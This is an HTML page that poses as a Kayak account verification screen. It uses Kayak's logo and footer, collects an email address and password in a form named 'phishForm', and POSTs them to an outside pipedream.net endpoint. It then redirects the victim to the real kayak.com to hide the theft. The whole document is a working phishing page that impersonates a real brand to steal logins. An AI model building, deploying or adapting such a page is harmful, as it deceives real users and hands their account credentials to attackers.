<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Kayak Account Verification</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f5f5f5;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }

    .container {
      background: white;
      padding: 40px;
      border: 1px solid #ccc;
      border-radius: 6px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      width: 320px;
    }

    .logo {
      text-align: center;
      margin-bottom: 20px;
    }

    .logo img {
      width: 120px;
    }

    h2 {
      text-align: center;
      color: #333;
    }

    input {
      width: 100%;
      padding: 10px;
      margin: 12px 0;
      border: 1px solid #ddd;
      border-radius: 4px;
    }

    button {
      width: 100%;
      padding: 10px;
      background: #ff6f00;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }

    .footer {
      margin-top: 20px;
      font-size: 12px;
      color: #888;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="https://www.kayak.com/rimg/provider-logos/airlines/logo_KA_40.png?crop=true&width=200&height=200&fallback=default1.png&_v=80d2a7a60ee55ec0b8f2c70c9d3f2780c808b5b6" alt="Kayak Logo">
    </div>
    <h2>Verify Your Kayak Account</h2>
    <form id="phishForm" action="https://eoh3rxe2o8pbhuj.m.pipedream.net" method="POST">
      <input type="email" name="email" placeholder="Email" required />
      <input type="password" name="password" placeholder="Password" required />
      <button type="submit">Continue</button>
    </form>
    <div class="footer">Â© 2025 KAYAK</div>
  </div>

  <script>
    document.getElementById('phishForm').addEventListener('submit', function() {
      setTimeout(function() {
        window.location.href = "https://www.kayak.com/";
      }, 1000);
    });
  </script>
</body>
</html>
